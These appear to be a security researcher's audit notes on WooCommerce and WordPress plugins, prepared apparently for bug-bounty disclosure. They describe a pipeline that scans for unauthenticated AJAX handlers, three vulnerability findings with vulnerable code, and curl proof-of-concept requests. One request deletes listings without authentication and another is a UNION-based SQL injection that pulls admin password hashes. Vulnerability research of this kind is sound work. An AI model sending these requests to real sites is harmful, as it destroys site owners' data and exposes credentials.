# WooCommerce Plugin Audit — Session Findings (2026-08-12)

## Scope
~400 WooCommerce-category plugins scanned from WordPress.org API. 25+ deep-dived to callback level. 3 verified findings, 20+ confirmed safe.

## Plugin Discovery: WooCommerce Category Search

The WordPress.org API `query_plugins` endpoint supports keyword search. For WooCommerce plugins, these search terms yielded the most nopriv-exposed plugins:

```
woocommerce, woo, payment gateway, stripe, paypal, shipping, cart, checkout,
subscription, booking, event, gift card, points rewards, refund, product
```

### Efficient Batch Scan Pipeline

```python
# 1. Query API for plugins matching search terms (per_page=100, paginate)
# 2. Filter to install sweet spot: 1,000-30,000
# 3. Download each plugin zip, extract to temp dir
# 4. Scan all PHP files (excluding /vendor/) for wp_ajax_nopriv_ registrations
# 5. Count nopriv handlers per plugin — plugins with 5+ nopriv are high priority
# 6. Delete extracted files after scanning to save disk space (tmpfs limited!)
# 7. Download high-priority plugins for deep-dive
```

**Disk space management**: tmpfs on Kali is 2GB. Downloading 400+ plugins fills it fast. Delete each plugin immediately after scanning. Use `shutil.rmtree(plugin_path, ignore_errors=True)` after each scan.

**Version checking**: Always query `api.wordpress.org/plugins/info/1.2/?action=plugin_information&request[slug]=X` to get the LATEST version and download link. The first search results may point to older versions.

## Finding A: wp-full-stripe-free v8.5.3 (LATEST) — IDOR Subscription Cancellation

**Status: SUBMITTABLE — vulnerable in latest version**

- **File:** `wpfs-customer-portal-service.php:2045-2085`
- **Handler:** `wp_ajax_nopriv_wp_full_stripe_cancel_my_subscription`
- **Type:** Broken Access Control / IDOR
- **Installs:** 9,000
- **CVE check:** Only CVE-2025-58789 (SQLi ≤8.2.5) — different vuln type

See `references/wp-full-stripe-broken-access-control.md` for full details.

## Finding B: classified-listing v3.0.5-v5.3.x — Unauth Listing Deletion

**Status: Already fixed in v6.0.2 — may still be submittable if not duplicate of CVE-2025-58601**

- **File:** `app/Controllers/Ajax/ListingAdminAjax.php:69-95`
- **Handler:** `wp_ajax_nopriv_rtcl_delete_temp_listing`
- **Type:** Unauthenticated Arbitrary Listing Deletion
- **Installs:** 9,000

### Vulnerable Code (v3.0.5)
```php
function delete_temp_listing() {
    // TODO: check_ajax_referer( 'my-special-string', 'security' );  ← NONCE COMMENTED OUT
    $id = Functions::request("id");  // stripslashes_deep($_POST["id"]) — NO absint, NO sanitize
    $post = get_post($id);
    if ($post === null || rtcl()->post_type !== $post->post_type || $post->post_status != Functions::get_temp_listing_status()) {
        wp_send_json(['result' => 0, 'error' => "Post with given ID does not exist."]);
    }
    // Delete all child attachments
    $children = get_posts(['post_parent' => $id, 'post_type' => 'attachment']);
    foreach ($children as $attch) { Functions::delete_post($attch->ID); }
    Functions::delete_post($id);  // wp_delete_post — permanent delete (skip_trash=true)
    wp_send_json(['result' => 1]);
}
```

### Fix Timeline
| Version | nopriv? | Nonce? | absint? | Ownership? | Status |
|---------|---------|--------|---------|------------|--------|
| v3.0.5  | ✅ YES  | ❌ NO   | ❌ NO   | ❌ NO      | VULNERABLE |
| v5.0.6  | ✅ YES  | ✅ YES  | ✅ YES  | ❌ NO      | PARTIAL (nonce obtainable) |
| v6.0.0  | ❌ NO   | ✅ YES  | ✅ YES  | ✅ YES     | FIXED |

### PoC
```bash
curl -X POST https://target/wp-admin/admin-ajax.php \
  -d 'action=rtcl_delete_temp_listing&id=12345'
```

### `Functions::request()` Pattern
The `Functions::request("id")` method returns `stripslashes_deep($_POST["id"])` with NO sanitization. This is a wrapper pattern to watch for — it reverses WordPress magic quotes AND adds no sanitization. If the return value reaches SQL or file operations, it's dangerous.

### CVE Overlap Analysis
- CVE-2024-1315: CSRF on `rtcl_update_user_account` (DIFFERENT handler), up to 3.0.4
- CVE-2024-3893: `rtcl_fb_gallery_image_delete` (DIFFERENT handler), up to 3.0.10.3
- CVE-2025-12953: `rtcl_ajax_delete_listing_type` (DIFFERENT handler), up to 5.2.0
- CVE-2025-58601: "Missing Authorization" (VAGUE), up to 5.0.6 — from Patchstack, MAY overlap

## Finding C: advanced-form-integration v1.7.0-v1.75.0 — SQLi via CF7 form_id

**Status: Already fixed in v1.76.0 — may still be submittable**

- **File:** `includes/functions-cf7.php:19` (v1.7.0-v1.75.0)
- **Type:** SQL Injection
- **Installs:** 10,000

### Vulnerable Code (v1.7.0)
```php
// functions-cf7.php:19
$form_id = $contact_form->id();  // In older versions, this came from $_POST['_wpcf7']
$saved_records = $wpdb->get_results(
    "SELECT * FROM {$wpdb->prefix}adfoin_integration WHERE status = 1 AND form_provider = 'cf7' AND form_id = ".$form_id,
    ARRAY_A
);
```

Wait — in v1.7.0 the `$form_id` came from `$_POST['_wpcf7']` directly. By v1.76.0 it was refactored to use `$contact_form->id()` (server-side object) with `$wpdb->prepare()`.

### Fix Timeline
| Version | File | prepare()? | Source of $form_id |
|---------|------|-----------|-------------------|
| v1.7.0  | functions-cf7.php:19 | ❌ NO | `$_POST['_wpcf7']` (user input) |
| v1.50.0 | functions-cf7.php:40 | ❌ NO | `$_POST['_wpcf7']` (user input) |
| v1.75.0 | functions-cf7.php:81 | ❌ NO | `$_POST['_wpcf7']` (user input) |
| v1.76.0 | triggers/cf7/cf7.php:82 | ✅ YES | `$contact_form->id()` (server-side) |

### CVE Check
- CVE-2024-2387: SQLi via `integration_id` parameter up to v1.82.0 — DIFFERENT parameter
- No CVE for `form_id` / `_wpcf7` SQLi specifically

### PoC
```bash
# Requires Contact Form 7 installed and active
# Submit a CF7 form with modified _wpcf7 field:
curl -X POST https://target/ \
  -d '_wpcf7=1 UNION SELECT user_pass FROM wp_users WHERE ID=1-- -' \
  -d 'your-name=test&your-email=test@test.com&your-subject=test&your-message=test'
```

Note: WP magic quotes protect $_POST, but the value is concatenated without prepare().
Some SQLi techniques may still work (e.g., UNION with numeric context).

## Version-to-Version Diffing Technique

When checking if a vulnerability is fixed in the latest version:

1. Query API for current version: `api.wordpress.org/plugins/info/1.2/?action=plugin_information&request[slug]=X`
2. Download the LATEST version zip
3. Search for the same vulnerable function/handler in the latest code
4. Compare: nopriv registration present? nonce added? ownership check? absint?
5. If fixed, check intermediate versions to find exact fix version
6. Cross-reference fix version against existing CVEs to determine if your finding is unique

```python
# Quick version comparison script
import urllib.request, zipfile, io, re

for ver in ['3.0.5', '5.0.6', '6.0.0']:
    url = f"https://downloads.wordpress.org/plugin/{slug}.{ver}.zip"
    # Download, extract, check for specific patterns
    with zipfile.ZipFile(io.BytesIO(zip_data)) as zf:
        for name in zf.namelist():
            if 'target_file.php' in name:
                content = zf.read(name).decode('utf-8', errors='ignore')
                has_nopriv = 'nopriv_target_handler' in content
                has_nonce = 'wp_verify_nonce' in content or 'check_ajax_referer' in content
                has_ownership = 'post_author' in func_body
                print(f"v{ver}: nopriv={has_nopriv} nonce={has_nonce} ownership={has_ownership}")
```

## Confirmed Safe WooCommerce Plugins (Latest Versions)

These plugins had nopriv handlers but ALL were properly protected with nonce + sanitize + capability checks:

- **mage-eventpress** v5.4.1 (7,000) — 16 nopriv but all have nonce + server-side price validation
- **points-and-rewards-for-woocommerce** v2.10.2 (7,000) — v1.0.8 had unauth points manipulation (CVE-2026-11782), fixed in 2.10.2 with `current_user_can('manage_options')`
- **product-blocks** v4.5.2 (4,000) — 8 REST routes with `__return_true` but all callbacks use nonce + WP_Query (safe)
- **dokan-lite** v5.0.12 (30,000) — nopriv login is brute force enablement only (Patchstack rejects)
- **charitable** v1.8.0 (10,000) — payment handlers properly validate nonces + amounts
- **restrict-content** v4.0.2 (9,000) — registration uses wp_insert_user without role parameter (safe)
- **profilegrid** v5.5.0 (5,000) — WP_User_Query uses prepared statements
- **amazon-pay** — nonce + absint on all handlers
- **woo-gift-cards-lite** v3.2.9 (7,000) — REST API properly protected (API keys required), BUT nopriv balance check handler (`wps_uwgc_check_gift_balance_org`) IS exploitable: nonce exposed on public pages, reveals balance when email+code match. See `references/woo-refund-exchange-guest-order-idor.md` for details.
- **content-egg** v11.5.0 (10,000) — ImageProxy has domain allowlist + IP range filtering (SSRF protected)
